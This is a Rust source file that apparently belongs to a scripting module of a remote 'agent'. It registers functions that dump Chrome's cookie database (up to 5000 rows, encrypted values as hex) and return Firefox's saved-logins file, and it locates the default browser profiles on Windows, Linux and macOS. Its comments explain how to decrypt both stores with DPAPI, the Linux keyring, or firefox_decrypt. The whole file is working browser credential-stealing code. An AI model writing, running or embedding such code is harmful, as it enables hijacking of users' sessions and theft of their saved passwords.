// src/agent/scripting/browser.rs
use rhai::Engine;
use std::fs;

pub fn register(engine: &mut Engine) {

    // ── Chrome cookies ────────────────────────────────────────────────────────
    // Reads Chrome's SQLite Cookies database with SQLITE_OPEN_READ_ONLY so a
    // running browser is not disturbed.  The `encrypted_value` column is
    // returned as lowercase hex; pipe it through internal_dpapi_decrypt
    // (Windows) or the linux-keyring AES path to recover plaintext cookies.
    engine.register_fn("internal_chrome_cookies", |profile_path: &str| -> String {
        let db_path = if !profile_path.is_empty() {
            format!("{}/Cookies", profile_path.trim_end_matches('/'))
        } else {
            default_chrome_cookies_path()
        };

        let conn = match rusqlite::Connection::open_with_flags(
            &db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY
                | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
        ) {
            Ok(c)  => c,
            Err(e) => return format!("Error: {}", e),
        };

        let mut stmt = match conn.prepare(
            "SELECT host_key, name, path, is_secure, expires_utc, \
                    value, hex(encrypted_value) \
             FROM cookies ORDER BY host_key LIMIT 5000",
        ) {
            Ok(s)  => s,
            Err(e) => return format!("Error: {}", e),
        };

        let rows: Vec<serde_json::Value> = stmt
            .query_map([], |row| {
                Ok(serde_json::json!({
                    "host":            row.get::<_, String>(0).unwrap_or_default(),
                    "name":            row.get::<_, String>(1).unwrap_or_default(),
                    "path":            row.get::<_, String>(2).unwrap_or_default(),
                    "secure":          row.get::<_, bool>(3).unwrap_or(false),
                    "expires_utc":     row.get::<_, i64>(4).unwrap_or(0),
                    "value":           row.get::<_, String>(5).unwrap_or_default(),
                    "encrypted_value": row.get::<_, String>(6).unwrap_or_default(),
                }))
            })
            .ok()
            .map(|r| r.filter_map(|v| v.ok()).collect())
            .unwrap_or_default();

        serde_json::to_string(&rows).unwrap_or("[]".into())
    });

    // ── Firefox logins ────────────────────────────────────────────────────────
    // Returns the raw contents of logins.json.  Credentials are encrypted with
    // NSS (3DES-CBC); decrypt with the mozilla-decrypt library or the
    // `firefox_decrypt` tool using the profile's key4.db + cert9.db.
    engine.register_fn("internal_firefox_logins", |profile_path: &str| -> String {
        let logins_file = if !profile_path.is_empty() {
            format!("{}/logins.json", profile_path.trim_end_matches('/'))
        } else {
            find_firefox_logins()
        };

        if logins_file.is_empty() {
            return "Error: logins.json not found — pass the profile directory explicitly".into();
        }
        fs::read_to_string(&logins_file).unwrap_or_else(|e| format!("Error: {}", e))
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Platform-specific default path resolution
// ─────────────────────────────────────────────────────────────────────────────

fn default_chrome_cookies_path() -> String {
    #[cfg(target_os = "windows")]
    {
        format!(
            "{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
            std::env::var("USERPROFILE").unwrap_or_default()
        )
    }
    #[cfg(target_os = "linux")]
    {
        format!(
            "{}/.config/google-chrome/Default/Cookies",
            std::env::var("HOME").unwrap_or_default()
        )
    }
    #[cfg(target_os = "macos")]
    {
        format!(
            "{}/Library/Application Support/Google/Chrome/Default/Cookies",
            std::env::var("HOME").unwrap_or_default()
        )
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    String::new()
}

fn find_firefox_logins() -> String {
    #[cfg(target_os = "windows")]
    let base = format!(
        "{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
        std::env::var("APPDATA").unwrap_or_default()
    );
    #[cfg(not(target_os = "windows"))]
    let base = format!(
        "{}/.mozilla/firefox",
        std::env::var("HOME").unwrap_or_default()
    );

    fs::read_dir(&base)
        .ok()
        .and_then(|rd| {
            rd.flatten()
                .map(|e| e.path().join("logins.json"))
                .find(|p| p.exists())
                .map(|p| p.to_string_lossy().to_string())
        })
        .unwrap_or_default()
}
